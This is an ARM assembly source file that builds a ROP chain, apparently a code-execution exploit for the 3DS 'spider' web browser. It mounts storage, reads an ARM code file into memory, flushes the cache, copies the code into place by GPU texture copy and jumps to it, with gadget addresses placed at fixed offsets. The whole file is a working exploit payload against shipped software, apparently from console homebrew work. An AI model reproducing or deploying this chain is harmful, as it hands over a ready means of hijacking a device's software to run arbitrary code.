	.arm
	.text

#define SPIDER_ROP_LOC
#include "rop.h"

#define CODE_SIZE 0x00004000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_file_open(THIS, FileName, FILE_READ)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, CODE_SIZE+SPIDER_ARM_CODE_OFFSET)
	rop_flush_data_cache(BUFFER_LOC+SPIDER_ARM_CODE_OFFSET, CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC+SPIDER_ARM_CODE_OFFSET, CODE_TARGET, CODE_SIZE)
	rop_sleep(1000000000)
	rop_jump_arm
.org 0x0F4, GARBAGE
	.word ROP_LOC+_start+0x8C
.org 0x128, GARBAGE
	.word ROP_LOC+_start, 0, POP_PC
.org 0x158, GARBAGE
	.word POP_PC, POP_PC
FileName:
#ifdef SPIDER_ARM_CODE
	#define S_(x)	#x
	#define S(x)	S_(x)
	.string16 S(SPIDER_ARM_CODE)
#endif
.org 0x21C, GARBAGE
	.word MAGIC
